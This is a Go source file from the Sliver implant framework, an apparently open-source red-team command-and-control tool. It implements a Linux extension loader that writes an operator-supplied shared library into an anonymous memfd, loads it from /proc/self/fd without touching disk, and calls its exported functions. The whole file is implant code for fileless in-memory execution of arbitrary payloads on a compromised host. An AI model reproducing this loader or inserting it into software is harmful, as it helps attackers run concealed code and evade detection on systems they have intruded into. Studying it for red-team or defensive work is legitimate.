//go:build linux

package extension

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"fmt"
	"log"
	"unsafe"

	"github.com/ebitengine/purego"
	"github.com/justincormack/go-memfd"
)

type LinuxExtension struct {
	id          string
	data        []byte
	module      uintptr
	arch        string
	serverStore bool
	init        string
	onFinish    func([]byte)
}

func NewLinuxExtension(data []byte, id string, arch string, init string) *LinuxExtension {
	return &LinuxExtension{
		id:   id,
		data: data,
		arch: arch,
		init: init,
	}
}

func (d *LinuxExtension) GetID() string {
	return d.id
}

func (d *LinuxExtension) GetArch() string {
	return d.arch
}

func (d *LinuxExtension) Load() error {
    mfd, err := createAndWriteMemFd(d.data)
    if err != nil {
        log.Printf("Failed to create and write memfd: %v", err)
        return err
    }
    defer mfd.Close() // Ensure the memfd is closed after loading

    // Obtain the file descriptor
    fd := mfd.Fd()

    // Construct the path to the memfd
    path := fmt.Sprintf("/proc/self/fd/%d", fd)

    // Load the shared library from the memfd
    d.module, err = purego.Dlopen(path, purego.RTLD_NOW|purego.RTLD_GLOBAL)
    if err != nil {
        log.Printf("Failed to load shared library from memfd: %v", err)
        return err
    }

    // Initialize the library if an init function is specified
    if d.init != "" {
        var initFunc func()
        purego.RegisterLibFunc(&initFunc, d.module, d.init)
        initFunc()
    }

    return nil
}

func (d *LinuxExtension) Call(export string, arguments []byte, onFinish func([]byte)) error {
	d.onFinish = onFinish
	outCallback := purego.NewCallback(d.extensionCallback)
	var exportFunc func([]byte, uint64, uintptr) uint32
	purego.RegisterLibFunc(&exportFunc, d.module, export)
	exportFunc(arguments, uint64(len(arguments)), outCallback)
	return nil
}

func (d *LinuxExtension) extensionCallback(data uintptr, length uintptr) {
	outDataSize := int(length)
	outBytes := unsafe.Slice((*byte)(unsafe.Pointer(data)), outDataSize)
	d.onFinish(outBytes)
}

func createAndWriteMemFd(data []byte) (*memfd.Memfd, error) {
    // Create a new memfd with desired flags
    mfd, err := memfd.Create()
    if err != nil {
        return nil, fmt.Errorf("failed to create memfd: %w", err)
    }

    // Write data to the memfd
    if _, err := mfd.Write(data); err != nil {
        mfd.Close()
        return nil, fmt.Errorf("failed to write to memfd: %w", err)
    }

    // Set the size of the memfd to match the data length
    if err := mfd.SetSize(int64(len(data))); err != nil {
        mfd.Close()
        return nil, fmt.Errorf("failed to set memfd size: %w", err)
    }

    // Optionally, set seals to prevent further modifications
    if err := mfd.SetSeals(memfd.SealAll); err != nil {
        mfd.Close()
        return nil, fmt.Errorf("failed to set memfd seals: %w", err)
    }

    return mfd, nil
}

// itoa converts an integer to a string (quick helper function)
func itoa(val int) string {
	return fmt.Sprintf("%d", val)
}

